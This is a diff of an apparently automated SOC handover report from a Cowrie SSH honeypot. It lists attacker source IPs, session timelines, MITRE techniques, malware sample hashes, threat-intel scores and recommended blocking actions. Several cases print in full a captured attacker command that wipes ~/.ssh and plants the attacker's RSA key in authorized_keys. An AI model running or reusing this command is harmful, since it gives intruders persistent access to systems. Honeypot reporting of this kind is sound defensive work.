+| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
+| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
+| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-05-01 20:20:56` | `cowrie.session.connect` |
+| `2026-05-01 20:20:56` | `cowrie.client.version` |
+| `2026-05-01 20:20:56` | `cowrie.client.kex` |
+| `2026-05-01 20:20:57` | `cowrie.login.success` |
+| `2026-05-01 20:20:57` | `cowrie.session.params` |
+| `2026-05-01 20:20:57` | `cowrie.command.input` |
+| `2026-05-01 20:20:57` | `cowrie.command.failed` |
+| `2026-05-01 20:20:57` | `cowrie.log.closed` |
+| `2026-05-01 20:20:58` | `cowrie.session.params` |
+| `2026-05-01 20:20:58` | `cowrie.command.input` |
+| `2026-05-01 20:20:58` | `cowrie.session.file_download` |
+| `2026-05-01 20:20:58` | `cowrie.log.closed` |
+| `2026-05-01 20:21:01` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `43.154.195[.]142` to AbuseIPDB if not already reported
+- [ ] Block `43.154.195[.]142` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Submit download hash(es) to VirusTotal
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-c8ffa718c72c
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `43.154.195[.]142` |
+| **First Seen** | 2026-05-01 20:21 |
+| **Last Seen** | 2026-05-01 20:21 |
+| **Session Duration** | 1s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-05-01 20:21:00` | `cowrie.session.connect` |
+| `2026-05-01 20:21:00` | `cowrie.client.version` |
+| `2026-05-01 20:21:00` | `cowrie.client.kex` |
+| `2026-05-01 20:21:01` | `cowrie.login.success` |
+| `2026-05-01 20:21:01` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `43.154.195[.]142` to AbuseIPDB if not already reported
+- [ ] Block `43.154.195[.]142` at perimeter firewall / security group
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-d5086eac9a99
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `103.63.108[.]25` |
+| **First Seen** | 2026-05-01 20:22 |
+| **Last Seen** | 2026-05-01 20:23 |
+| **Session Duration** | 10s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
+| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
+| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
+| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-05-01 20:22:50` | `cowrie.session.connect` |
+| `2026-05-01 20:22:50` | `cowrie.client.version` |
+| `2026-05-01 20:22:50` | `cowrie.client.kex` |
+| `2026-05-01 20:22:51` | `cowrie.login.success` |
+| `2026-05-01 20:22:52` | `cowrie.session.params` |
+| `2026-05-01 20:22:52` | `cowrie.command.input` |
+| `2026-05-01 20:22:52` | `cowrie.command.failed` |
+| `2026-05-01 20:22:52` | `cowrie.log.closed` |
+| `2026-05-01 20:22:52` | `cowrie.session.params` |
+| `2026-05-01 20:22:52` | `cowrie.command.input` |
+| `2026-05-01 20:22:52` | `cowrie.session.file_download` |
+| `2026-05-01 20:22:52` | `cowrie.log.closed` |
+| `2026-05-01 20:23:00` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `103.63.108[.]25` to AbuseIPDB if not already reported
+- [ ] Block `103.63.108[.]25` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Submit download hash(es) to VirusTotal
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-c6d61bcc0c2a
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `103.63.108[.]25` |
+| **First Seen** | 2026-05-01 20:22 |
+| **Last Seen** | 2026-05-01 20:23 |
+| **Session Duration** | 5s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-05-01 20:22:55` | `cowrie.session.connect` |
+| `2026-05-01 20:22:55` | `cowrie.client.version` |
+| `2026-05-01 20:22:55` | `cowrie.client.kex` |
+| `2026-05-01 20:23:00` | `cowrie.login.success` |
+| `2026-05-01 20:23:00` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `103.63.108[.]25` to AbuseIPDB if not already reported
+- [ ] Block `103.63.108[.]25` at perimeter firewall / security group
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-eebbfd930412
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `103.75.183[.]233` |
+| **First Seen** | 2026-05-01 20:35 |
+| **Last Seen** | 2026-05-01 20:35 |
+| **Session Duration** | 3s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
+| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
+| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
+| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-05-01 20:35:31` | `cowrie.session.connect` |
+| `2026-05-01 20:35:31` | `cowrie.client.version` |
+| `2026-05-01 20:35:31` | `cowrie.client.kex` |
+| `2026-05-01 20:35:31` | `cowrie.login.success` |
+| `2026-05-01 20:35:31` | `cowrie.session.params` |
+| `2026-05-01 20:35:31` | `cowrie.command.input` |
+| `2026-05-01 20:35:31` | `cowrie.command.failed` |
+| `2026-05-01 20:35:31` | `cowrie.log.closed` |
+| `2026-05-01 20:35:32` | `cowrie.session.params` |
+| `2026-05-01 20:35:32` | `cowrie.command.input` |
+| `2026-05-01 20:35:32` | `cowrie.session.file_download` |
+| `2026-05-01 20:35:32` | `cowrie.log.closed` |
+| `2026-05-01 20:35:34` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `103.75.183[.]233` to AbuseIPDB if not already reported
+- [ ] Block `103.75.183[.]233` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Submit download hash(es) to VirusTotal
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-68dcdbf0aee3
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `103.75.183[.]233` |
+| **First Seen** | 2026-05-01 20:35 |
+| **Last Seen** | 2026-05-01 20:35 |
+| **Session Duration** | 0s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-05-01 20:35:33` | `cowrie.session.connect` |
+| `2026-05-01 20:35:33` | `cowrie.client.version` |
+| `2026-05-01 20:35:34` | `cowrie.client.kex` |
+| `2026-05-01 20:35:34` | `cowrie.login.success` |
+| `2026-05-01 20:35:34` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `103.75.183[.]233` to AbuseIPDB if not already reported
+- [ ] Block `103.75.183[.]233` at perimeter firewall / security group
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-7a15a6b59f46
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `103.75.183[.]233` |
+| **First Seen** | 2026-05-01 20:47 |
+| **Last Seen** | 2026-05-01 20:47 |
+| **Session Duration** | 3s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
+| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
+| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
+| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-05-01 20:47:09` | `cowrie.session.connect` |
+| `2026-05-01 20:47:09` | `cowrie.client.version` |
+| `2026-05-01 20:47:09` | `cowrie.client.kex` |
+| `2026-05-01 20:47:09` | `cowrie.login.success` |
+| `2026-05-01 20:47:09` | `cowrie.session.params` |
+| `2026-05-01 20:47:09` | `cowrie.command.input` |
+| `2026-05-01 20:47:09` | `cowrie.command.failed` |
+| `2026-05-01 20:47:09` | `cowrie.log.closed` |
+| `2026-05-01 20:47:10` | `cowrie.session.params` |
+| `2026-05-01 20:47:10` | `cowrie.command.input` |
+| `2026-05-01 20:47:10` | `cowrie.session.file_download` |
+| `2026-05-01 20:47:10` | `cowrie.log.closed` |
+| `2026-05-01 20:47:12` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `103.75.183[.]233` to AbuseIPDB if not already reported
+- [ ] Block `103.75.183[.]233` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Submit download hash(es) to VirusTotal
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-6d59f5e25d37
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `103.75.183[.]233` |
+| **First Seen** | 2026-05-01 20:47 |
+| **Last Seen** | 2026-05-01 20:47 |
+| **Session Duration** | 0s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-05-01 20:47:12` | `cowrie.session.connect` |
+| `2026-05-01 20:47:12` | `cowrie.client.version` |
+| `2026-05-01 20:47:12` | `cowrie.client.kex` |
+| `2026-05-01 20:47:12` | `cowrie.login.success` |
+| `2026-05-01 20:47:12` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `103.75.183[.]233` to AbuseIPDB if not already reported
+- [ ] Block `103.75.183[.]233` at perimeter firewall / security group
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
 ---
@@ -383,20 +1780,17 @@ Source IPs: `34.78.29.97`, `103.52.152.101`
 
 | IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
 |---|---|---|---|---|---|---|---|
-| `101.126.147[.]62` | **11** | 2026-05-01 17:03 | 2026-05-01 17:06 | 2m | 8 | `T1110.001 · T1592` | 🟠 MEDIUM |
-| `34.78.29[.]97` | **9** | 2026-05-01 18:39 | 2026-05-01 19:16 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
-| `196.41.210[.]156` | **8** | 2026-05-01 17:28 | 2026-05-01 17:42 | 14m | 0 | `T1592` | 🟢 LOW |
-| `87.236.176[.]85` | **2** | 2026-05-01 17:58 | 2026-05-01 17:58 | 0m | 0 | `T1592` | 🟢 LOW |
-| `101.0.79[.]78` | 1 | 2026-05-01 18:28 | 2026-05-01 18:29 | 30s | 0 | `T1592` | 🟢 LOW |
-| `103.203.57[.]19` | 1 | 2026-05-01 17:28 | 2026-05-01 17:28 | 5s | 0 | `T1592` | 🟢 LOW |
-| `103.52.152[.]101` | 1 | 2026-05-01 17:33 | 2026-05-01 17:33 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
-| `14.103.114[.]2` | 1 | 2026-05-01 18:32 | 2026-05-01 18:34 | 120s | 0 | `T1592` | 🟢 LOW |
-| `183.56.235[.]140` | 1 | 2026-05-01 18:36 | 2026-05-01 18:37 | 61s | 1 | `T1110.001` | 🟢 LOW |
-| `185.106.29[.]190` | 1 | 2026-05-01 18:10 | 2026-05-01 18:10 | 13s | 0 | `T1592` | 🟢 LOW |
+| `103.75.183[.]233` | **30** | 2026-05-01 20:02 | 2026-05-01 20:55 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
+| `43.154.195[.]142` | **22** | 2026-05-01 19:56 | 2026-05-01 20:21 | 0m | 22 | `T1110.001 · T1592` | 🟠 MEDIUM |
+| `34.78.29[.]97` | **21** | 2026-05-01 19:17 | 2026-05-01 19:33 | 0m | 21 | `T1110.001 · T1592` | 🟠 MEDIUM |
+| `183.129.249[.]4` | **2** | 2026-05-01 19:27 | 2026-05-01 19:29 | 2m | 0 | `T1592` | 🟢 LOW |
+| `103.63.108[.]25` | 1 | 2026-05-01 20:22 | 2026-05-01 20:22 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
+| `14.103.115[.]237` | 1 | 2026-05-01 19:43 | 2026-05-01 19:45 | 120s | 0 | `T1592` | 🟢 LOW |
+| `220.154.138[.]116` | 1 | 2026-05-01 19:45 | 2026-05-01 19:45 | 7s | 0 | `T1592` | 🟢 LOW |
 
 ---
 
-## 🦠 Malware Analysis Results (25 sample(s))
+## 🦠 Malware Analysis Results (26 sample(s))
 
 | File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
 |---|---|---|---|---|---|
@@ -405,6 +1799,7 @@ Source IPs: `34.78.29.97`, `103.52.152.101`
 | `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
 | `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
 | `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
+| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
 | `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
 | `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
 | `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
@@ -432,16 +1827,16 @@ Source IPs: `34.78.29.97`, `103.52.152.101`
 
 | IP | Country | ISP | Abuse Score | OTX Pulses |
 |---|---|---|---|---|
-| `14.103.114[.]2` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
-| `101.126.147[.]62` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 23 |
-| `183.56.235[.]140` | CN | CHINANET Guangdong province network | **100** ⚠️ | 36 |
-| `185.106.29[.]190` | IQ | O3 Telecom | **100** ⚠️ | 4 |
-| `87.236.176[.]85` | GB | Driftnet Ltd | **100** ⚠️ | 50 |
+| `220.154.138[.]116` | CN | China Telecom Group Corporation Qingdao Branch | **100** ⚠️ | 3 |
+| `14.103.115[.]237` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 34 |
+| `103.75.183[.]233` | VN | BQT computer technology | **100** ⚠️ | 19 |
 | `34.78.29[.]97` | BE | Google LLC | **100** ⚠️ | 50 |
-| `103.203.57[.]19` | US | Beijing Tiantexin Tech. Co., Ltd. | **100** ⚠️ | 50 |
-| `103.52.152[.]101` | HK | VAPELINE TECHNOLOGY(HK).,LIMITED | **100** ⚠️ | 20 |
-| `196.41.210[.]156` | ZA | Vox Telecommunications PTY Ltd | **100** ⚠️ | 2 |
-| `101.0.79[.]78` | AU | Hostopia Australia Pty Ltd | **83** ⚠️ | 0 |
+| `43.154.195[.]142` | HK | Asia Pacific Network Information Center, Pty. Ltd. | **100** ⚠️ | 50 |
+| `183.129.249[.]4` | CN | CHINANET-ZJ Zhongxin node network | **100** ⚠️ | 6 |
+| `103.63.108[.]25` | VN | Hai Phong Brand - CMC Telecommunication Infrastructure Corporation | **100** ⚠️ | 50 |
+| `149.210.230[.]47` | NL | TransIP B.V. | **77** | 0 |
+| `181.215.226[.]227` | GB | IPXO | **76** | 0 |
+| `103.3.164[.]243` | SG | ReadySpace Cloud Services - Singapore | **67** | 0 |
 
 ---
 
@@ -449,23 +1844,26 @@ Source IPs: `34.78.29.97`, `103.52.152.101`
 
 | TTP ID | Count |
 |---|---|
-| [T1592](https://attack.mitre.org/techniques/T1592) | 27 |
-| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 19 |
-| [T1078](https://attack.mitre.org/techniques/T1078) | 6 |
-| [T1105](https://attack.mitre.org/techniques/T1105) | 3 |
-| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |
+| [T1592](https://attack.mitre.org/techniques/T1592) | 95 |
+| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 76 |
+| [T1078](https://attack.mitre.org/techniques/T1078) | 19 |
+| [T1105](https://attack.mitre.org/techniques/T1105) | 10 |
+| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 9 |
 
 ---
 
-## 🔕 False Positive Summary (2064 filtered)
+## 🔕 False Positive Summary (263 filtered)
 
 | Reason | Count |
 |---|---|
-| AbuseIPDB score 0 below threshold 25 | 38 |
-| AbuseIPDB score 16 below threshold 25 | 13 |
-| AbuseIPDB score 3 below threshold 25 | 2 |
-| AbuseIPDB score 4 below threshold 25 | 1 |
-| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2010 |
+| AbuseIPDB score 0 below threshold 25 | 19 |
+| AbuseIPDB score 11 below threshold 25 | 1 |
+| AbuseIPDB score 13 below threshold 25 | 1 |
+| AbuseIPDB score 14 below threshold 25 | 1 |
+| AbuseIPDB score 18 below threshold 25 | 1 |
+| AbuseIPDB score 3 below threshold 25 | 1 |
+| AbuseIPDB score 5 below threshold 25 | 1 |
+| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 238 |
 
 > FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.
 
@@ -476,19 +1874,19 @@ Source IPs: `34.78.29.97`, `103.52.152.101`
 | Tool | Role | Status |
 |---|---|---|
 | Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
-| Tool 26  | Incident Timeline Generator | ✅ 2106 cases |
-| Tool 34  | Credential Extractor        | ✅ 25 attempts |
-| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
-| Tool 36  | Command Clustering          | ✅ 1 clusters |
-| Tool 27  | Threat Intel Feeder         | ✅ 43 IPs enriched |
-| Tool 29  | False Positive Tracker      | ✅ 2064 filtered (98.0%) |
+| Tool 26  | Incident Timeline Generator | ✅ 360 cases |
+| Tool 34  | Credential Extractor        | ✅ 95 attempts |
+| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
+| Tool 36  | Command Clustering          | ✅ 2 clusters |
+| Tool 27  | Threat Intel Feeder         | ✅ 31 IPs enriched |
+| Tool 29  | False Positive Tracker      | ✅ 263 filtered (73.1%) |
 | Tool 30  | Metric Exporter             | ✅ stats.json written |
-| Tool 30b | ASN Clustering              | ✅ 42 ASNs |
-| Tool 31  | Malware Analyzer            | ✅ 25 files |
+| Tool 30b | ASN Clustering              | ✅ 27 ASNs |
+| Tool 31  | Malware Analyzer            | ✅ 26 files |
 | Tool 33  | YARA Classifier             | ✅ 8 classified |
 | Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |
 
-> **Report grouping:** 6 priority case(s) shown individually · 10 recon entry/entries in table (4 group(s) consolidating 30 session(s)).
+> **Report grouping:** 19 priority case(s) shown individually · 7 recon entry/entries in table (4 group(s) consolidating 75 session(s)).
 
 ---
 
@@ -504,4 +1902,4 @@ Source IPs: `34.78.29.97`, `103.52.152.101`
 
 _Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
 _Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
-_Report time: 2026-05-01T19:18:02Z_
+_Report time: 2026-05-01T20:58:22Z_
